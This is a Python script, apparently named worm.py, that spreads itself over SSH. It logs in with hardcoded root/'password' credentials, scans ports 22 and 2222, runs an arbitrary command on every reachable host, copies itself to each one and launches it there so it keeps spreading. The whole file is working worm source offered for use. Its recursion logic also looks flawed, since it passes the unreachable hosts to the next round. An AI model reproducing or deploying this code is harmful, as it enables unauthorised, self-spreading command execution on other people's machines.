#!/usr/bin/env python

import argparse
import paramiko
import socket
import time

def execute_command_on_host(command, host, username, password):
    try:
        # Establish an SSH connection to the host
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password, timeout=10)

        # Execute the provided command on the host
        stdin, stdout, stderr = client.exec_command(command)
        stdout.channel.recv_exit_status()  # Wait for command to complete
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        client.close()
        if error:
            return f"Error while executing the command on {host}: {error}"
        return output
    except Exception as e:
        return f"Error while executing the command on {host}: {e}"

def copy_script_to_host(script_path, host, username, password):
    try:
        # Establish an SSH connection to the host
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        
        # Copy the script to the host using SFTP
        sftp = client.open_sftp()
        sftp.put(script_path, script_path)
        sftp.close()

        # Set the execution permission on the script
        command = f"chmod +x {script_path}"
        stdin, stdout, stderr = client.exec_command(command)
        stdout.channel.recv_exit_status()  # Wait for command to complete

        client.close()
        return True
    except Exception as e:
        return f"{host} - Error copying the script: {e}"

def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)  # Set a timeout of 1 second
    result = sock.connect_ex((ip, port))
    sock.close()
    return (result == 0)

def main():
    # UserName and Password: (Could be encrypted and then decrypted)
    username = "root"
    password = "password"

    # Get the local hostname and IP address: 
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    # Path to code: 
    script_path = "/tmp/worm.py"

    # Parsing args to worm.py:
    parser = argparse.ArgumentParser(description="Execute a command on multiple hosts.")
    parser.add_argument("command", help="Linux command to execute")
    parser.add_argument("hosts", help="Comma-separated list of IP addresses or hostnames")
    args = parser.parse_args()
    if args:
        command = args.command
        hosts = args.hosts.split(",")

    # Debugging: Print initial list of hosts
    # print(f"Initial hosts: {hosts}")

    # Checking which hosts are not available: 
    hostsToRemove = []
    # print(f"In {IPAddr} the available hosts are: ")
    for host in hosts:
        if not (check_port(host, 22) or check_port(host, 2222)):
            hostsToRemove.append(host)
            # print(f"{host} is not available")
        # else: 
            # print(f"{host} is available")

    # Debugging: Print hosts to be removed
    # print(f"Hosts to be removed: {hostsToRemove}")

    # Removing the hosts that are not available: 
    hosts = [host for host in hosts if host not in hostsToRemove]
    
    # Debugging: Print hosts after removal
    # print(f"Hosts after removal: {hosts}")

    # Execute the original command on each host
    for host in hosts:
        output = execute_command_on_host(command, host, username, password)
        print(f"{host} returned:\n{output}")

    # Remove the local IP address if it is in the list of hosts: 
    if IPAddr in hosts:
        hosts.remove(IPAddr)
        
    # Debugging: Print hosts after removing local IP
    # print(f"Hosts after removing local IP ({IPAddr}): {hosts}")

    # Copy the script to each host: 
    for host in hosts:
        result = copy_script_to_host(script_path, host, username, password)
        # if result is True:
            # print(f"Script copied to {host}")
        # else:
            # print(result)
            
    hosts_string = ','.join(hostsToRemove)
    total_command = f"{script_path} {command} {hosts_string}" if hosts_string else ""

    # Debugging: Print the total command and hosts string for next iteration
    # print(f"hosts_string for next iteration: {hosts_string}")
    # print(f"Total command to be executed on next hosts: {total_command}")
    # print(f"Hosts for recursive call: {hosts}")

    # Execute the worm.py command on each available host with the unavailable list, if there are hosts to call: 
    if total_command:
        for host in hosts:
            result = execute_command_on_host(total_command, host, username, password)
            # print(f"Result from executing command on {host}: {result}")
            if "Error" in result:
                print(f"{host} - host unreachable")
            else:
                print(result)

if __name__ == "__main__":
    main()
